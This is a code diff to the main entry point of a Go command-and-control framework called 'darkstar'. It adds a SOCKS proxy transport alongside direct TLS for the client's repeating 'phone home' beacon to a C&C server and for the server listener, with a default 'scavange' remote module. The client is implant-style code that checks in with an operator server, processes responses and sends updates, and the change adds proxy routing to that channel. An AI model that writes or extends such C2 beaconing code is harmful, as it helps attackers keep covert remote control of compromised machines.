@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strconv"
+	"strings"
 	"time"
 
 	"github.com/AlexsJones/darkstar/database"
@@ -23,31 +25,53 @@ func main() {
 	var serverPort = flag.Int("serverport", 8080, "Server port")
 	var serverModule = flag.String("module", "scavange", "Sets the remote C&C operation")
 	var serverpath = flag.String("serverdbpath", "darkstar.db", "Set the sqlite3 database")
+	var transportMode = flag.String("transportmode", "SOCKS", "SOCKS or DIRECTTLS")
+	var socksProxyAddress = flag.String("socksproxy", "", "Set the remote socks proxy server to connect too")
+	var socksProxyPort = flag.String("socksport", "", "Set the remote socks proxy port to connect too")
 	flag.Parse()
 
 	switch *mode {
 	case "client":
 
+		//Create the initial phone home message------------------------------------
+		out := data.CreateMessage()
+		//-------------------------------------------------------------------------
+
+		//TLS Mode configuration --------------------------------------------------
 		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
 			RSABits: 2048, EcdsaCurve: "", CertPath: "client.pem", KeyPath: "client.key"}
 
 		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
 			os.Exit(1)
 		}
+		// ------------------------------------------------------------------------
+		//SOCKS Mode configuration ------------------------------------------------
 
-		//Create the initial phone home message------------------------------------
-		out := data.CreateMessage()
-		//--------------------------------------------------------------------------
 		config := &client.Configuration{
 			Address: *serverHostAddress, CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath, Port: *clientPort, SleepTime: time.Second * 3}
 		//Sends the initial client message
 		for {
-			r, n := client.Send(config, string(out))
+			var bytesout []byte
+			var num int
+			if strings.Compare(*transportMode, "DIRECTTLS") == 0 {
+				log.Println("Using DIRECTTLS sender")
+				bytesout, num = client.SendTLS(config, string(out))
+			} else {
+				log.Println("Using SOCKS sender")
 
-			processedResponse, shouldSend := client.ResponseProcessor(r[:n])
+				config.ProxyAddress = *socksProxyAddress
+				prt, err := strconv.Atoi(*socksProxyPort)
+				if err != nil {
+					panic(err)
+				}
+				config.ProxyPort = prt
+
+				bytesout, num = client.SendSOCKS(config, string(out))
+			}
+			processedResponse, shouldSend := client.ResponseProcessor(bytesout[:num])
 			if shouldSend {
 				log.Println("-------------------Parsed response from server and sending an update-------------------")
-				client.Send(config, processedResponse)
+				client.SendTLS(config, processedResponse)
 			}
 			time.Sleep(config.SleepTime)
 		}
@@ -64,6 +88,7 @@ func main() {
 		//Generate tables...
 		database.AutoMigrate(db)
 		// ------------------------------------------------------------------------
+
 		// tls generate certs -----------------------------------------------------
 		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
 			RSABits: 2048, EcdsaCurve: "", CertPath: "server.pem", KeyPath: "server.key"}
@@ -78,8 +103,16 @@ func main() {
 			ModuleName:    *serverModule,
 			Database:      db,
 		}
-		if err := server.Run(conf); err != nil {
-			log.Printf(err.Error())
+		if strings.Compare(*transportMode, "DIRECTTLS") == 0 {
+			log.Println("Using DIRECTTLS server")
+			if err := server.RunTLS(conf); err != nil {
+				log.Printf(err.Error())
+			}
+		} else {
+			log.Println("Using SOCKS server")
+			if err := server.Run(conf); err != nil {
+				log.Printf(err.Error())
+			}
 		}
 	}
 }
